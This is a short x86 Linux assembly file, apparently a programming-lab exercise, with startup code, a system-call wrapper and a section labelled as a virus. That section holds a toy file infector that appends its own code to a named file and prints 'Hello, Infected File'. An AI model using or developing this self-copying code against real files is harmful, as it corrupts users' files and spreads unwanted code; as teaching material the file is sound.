section .text
global _start
global system_call
extern main

global code_start
global code_end
global infection
global infector

_start:
    pop     dword ecx    ; ecx = argc
    mov     esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx      ; put the number of arguments into eax
    shl     eax,2        ; compute the size of argv in bytes
    add     eax,esi      ; add the size to the address of argv 
    add     eax,4        ; skip NULL at the end of argv
    push    dword eax    ; char *envp[]
    push    dword esi    ; char* argv[]
    push    dword ecx    ; int argc

    call    main         ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


;VIRUS
code_start:
infection:
    pushad                  

    mov     eax, 4        
    mov     ebx, 1          
    mov     ecx, virus_msg 
    mov     edx, virus_len  
    int     0x80

    popad                   
    ret

infector:
    push    ebp
    mov     ebp, esp
    pushad
    ; [ebp+8] now contains the pointer to the files name (char *filename)
    
    ; open the file
    mov     eax, 5          ; sys_open
    mov     ebx, [ebp+8]    ; filename
    mov     ecx, 0x401      ; O_WRONLY | O_APPEND
    mov     edx, 0644o      ; mode => owner = read+write | group = read-only | others = read-only
    int     0x80

    cmp     eax, 0          ; check for error
    jl      .infect_error 
    
    mov     esi, eax        ; esi = file descriptor

    ; infect the file
    mov     eax, 4          ; sys_write
    mov     ebx, esi        ; file descriptor
    mov     ecx, code_start ; pointer to the start of the code
    mov     edx, code_end   
    sub     edx, code_start ; calculating the length of the code
    int     0x80

    ; close the file
    mov     eax, 6          ; sys_close
    mov     ebx, esi        ; file descriptor
    int     0x80

.infect_error:
    popad
    pop     ebp
    ret

virus_msg: db "Hello, Infected File", 10
virus_len: equ $ - virus_msg
code_end: